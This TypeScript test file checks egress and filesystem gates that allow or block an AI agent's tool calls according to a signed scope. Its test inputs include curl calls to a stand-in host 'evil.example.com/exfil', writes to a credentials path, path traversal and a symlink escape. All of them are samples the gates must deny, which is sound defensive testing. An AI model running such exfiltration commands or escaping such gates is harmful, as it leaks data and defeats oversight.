/**
 * Integration tests for the exec-broker PreToolUse gates (`kit gate-egress` / `kit gate-fs`):
 * spawn the REAL compiled CLI with a hook payload on stdin, in a temp project, and assert on
 * the exit code — exactly how an agent harness runs the gate. exit 0 = allow, exit 2 = deny.
 */
import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, rmSync, mkdirSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { loadOrCreateIdentity } from "../identity.js";
import { PROFILE_FILE } from "../profile/schema.js";
import { signProfile } from "../profile/sign.js";

const CLI = fileURLToPath(new URL("../cli.js", import.meta.url));

let idDir: string;
let proj: string;
let savedIdEnv: string | undefined;

const SCOPED = `version = 1
[scope]
egress = ["api.acme.com"]
fs = ["src"]
`;

function runGate(gate: string, payload: unknown): { status: number | null; stderr: string } {
  const res = spawnSync(process.execPath, [CLI, gate], {
    input: JSON.stringify(payload),
    cwd: proj,
    encoding: "utf8",
    env: {
      ...process.env,
      KIT_IDENTITY_DIR: idDir,
      KIT_NON_INTERACTIVE: "1",
      KIT_NO_UPDATE_CHECK: "1",
      KIT_BUMBLEBEE: "0",
      KIT_NO_FAILURE_SIM: "1",
    },
  });
  return { status: res.status, stderr: res.stderr ?? "" };
}

const bash = (command: string) => ({ tool_name: "Bash", tool_input: { command } });
const write = (file_path: string) => ({
  tool_name: "Write",
  tool_input: { file_path, content: "x" },
});

beforeEach(async () => {
  idDir = mkdtempSync(join(tmpdir(), "kit-id-"));
  proj = mkdtempSync(join(tmpdir(), "kit-gates-"));
  savedIdEnv = process.env.KIT_IDENTITY_DIR;
  process.env.KIT_IDENTITY_DIR = idDir;
  loadOrCreateIdentity();
  writeFileSync(join(proj, PROFILE_FILE), SCOPED);
  mkdirSync(join(proj, "src"), { recursive: true }); // the declared [scope].fs root exists, as in a real project
  await signProfile(proj);
});

afterEach(() => {
  if (savedIdEnv === undefined) delete process.env.KIT_IDENTITY_DIR;
  else process.env.KIT_IDENTITY_DIR = savedIdEnv;
  rmSync(idDir, { recursive: true, force: true });
  rmSync(proj, { recursive: true, force: true });
});

describe("kit gate-egress (subprocess)", () => {
  it("allows an in-scope host and non-network commands", () => {
    assert.equal(runGate("gate-egress", bash("curl https://api.acme.com/v1")).status, 0);
    assert.equal(runGate("gate-egress", bash("npm test")).status, 0);
  });

  it("denies (exit 2) an off-scope host with an honest reason", () => {
    const r = runGate("gate-egress", bash("curl https://evil.example.com/x"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed egress scope/);
    assert.match(r.stderr, /evil\.example\.com/);
  });

  it("denies ALL network targets when the scope is unsigned (wired gate grants nothing)", () => {
    rmSync(join(proj, ".kit-profile.sig"), { force: true });
    const r = runGate("gate-egress", bash("curl https://api.acme.com/v1"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no verified scope/);
  });

  it("fails open only on a non-command / unparseable envelope", () => {
    assert.equal(runGate("gate-egress", { tool_name: "Read", tool_input: {} }).status, 0);
  });

  it("enforces scheme-less curl/wget targets (the common bypass): off-scope denied, in-scope allowed", () => {
    const off = runGate("gate-egress", bash("curl evil.example.com/exfil"));
    assert.equal(off.status, 2);
    assert.match(off.stderr, /evil\.example\.com/);
    assert.equal(runGate("gate-egress", bash("curl api.acme.com/v1")).status, 0);
  });
});

describe("kit gate-fs (subprocess)", () => {
  it("allows a write inside the signed fs scope", () => {
    assert.equal(runGate("gate-fs", write("src/index.ts")).status, 0);
  });

  it("denies (exit 2) a write outside the signed fs scope", () => {
    const r = runGate("gate-fs", write("secrets/creds.txt"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed fs scope/);
  });

  it("denies a traversal escape out of the project root", () => {
    assert.equal(runGate("gate-fs", write("../outside.txt")).status, 2);
  });

  it("denies writes when the profile was tampered after signing (fail-closed)", () => {
    writeFileSync(join(proj, PROFILE_FILE), SCOPED.replace("src", "anything"));
    const r = runGate("gate-fs", write("src/index.ts"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no verified scope/);
  });

  it("passes non-write tool calls through", () => {
    assert.equal(runGate("gate-fs", bash("ls")).status, 0);
  });

  it("denies a write through a symlink that escapes the signed root (realpath parity with broker)", () => {
    // A symlink INSIDE the signed `src` root pointing outside the project passes the pure
    // string-containment check but must be caught by the symlink-aware realpath check — exactly
    // what the canonical broker does. Without it the write escapes [scope].fs. (src/ is created in beforeEach.)
    symlinkSync(tmpdir(), join(proj, "src", "out")); // src/out -> outside the project
    const r = runGate("gate-fs", write("src/out/evil.txt"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed fs scope/);
  });
});
